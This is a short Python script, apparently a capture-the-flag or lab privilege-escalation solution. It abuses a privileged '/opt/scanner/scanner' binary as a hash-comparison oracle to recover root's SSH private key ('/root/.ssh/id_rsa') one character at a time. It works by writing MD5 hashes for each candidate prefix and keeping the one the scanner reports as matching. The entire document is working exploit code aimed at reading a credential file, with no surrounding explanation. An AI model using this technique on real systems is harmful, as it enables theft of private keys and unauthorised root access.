import string
import hashlib
import subprocess

base = ""
hasResult = True
hashMap = {}
readFile = "/root/.ssh/id_rsa"

def checkMatch():
    global base
    global hashMap
    result = subprocess.Popen(["/opt/scanner/scanner", "-c", readFile, "-h", "./hash.log", "-l", str(len(base) + 1)], stdout=subprocess.PIPE)
    for line in result.stdout:
        # print(line)
        line = str(line)
        if "[+]" in line:
            check = line.split(" ")
            if len(check) == 4:
                if check[1] in hashMap:
                    base = hashMap[check[1]]
                    return True
    return False

def writeFile(base):
    f = open("hash.log", "w")
    hashmap = {}
    for character in string.printable:
        check = base + character
        checkHash = hashlib.md5(check.encode())
        md5 = checkHash.hexdigest()
        hashMap[md5] = check
        f.write(md5 + ":" + md5)
        f.write("\n")
    f.close()

while hasResult:
    writeFile(base)
    hasResult = checkMatch()

print("Found")
print(base)
print("Done")
